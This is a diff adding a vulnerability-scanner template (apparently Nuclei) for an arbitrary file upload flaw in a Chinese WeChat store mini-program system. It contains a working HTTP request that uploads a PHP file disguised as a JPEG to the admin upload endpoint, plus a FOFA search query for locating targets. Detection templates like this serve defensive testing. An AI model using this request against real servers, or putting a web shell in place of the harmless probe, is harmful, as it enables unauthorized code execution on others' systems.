@@ -1,0 +1,42 @@
+id: wechat-stroe-app-onepic-uploade
+
+info:
+  name: 微信万能门店小程序系统 onepic_uploade - 任意文件上传漏洞
+  author: qwtd
+  severity: critical
+  description: 万能门店小程序DIY建站无限独立版非微擎应用，独立版是基于国内很火的ThinkPHP5框架开发的，适用于各行各业小程序、企业门店小程序，万能门店小程序管理系统onepic_uploade任意文件上传漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fonepic_uploade%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    max-request: 1
+    fofa-query: "/comhome/cases/index.html"
+    verified: false
+  tags: 微信万能门店小程序系统
+
+http:
+  - raw:
+      - |
+        POST /comadmin/Remote/onepic_uploade?file=file HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        ------WebKitFormBoundaryBiKyL9D0p5OtH5zz
+        Content-Disposition: form-data; name="file"; filename="1.php"
+        Content-Type: image/jpeg
+
+        <?php print('{{randstr}}');unlink(__FILE__);?>
+        ------WebKitFormBoundaryBiKyL9D0p5OtH5zz--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "[a-z0-9]{35}.php"
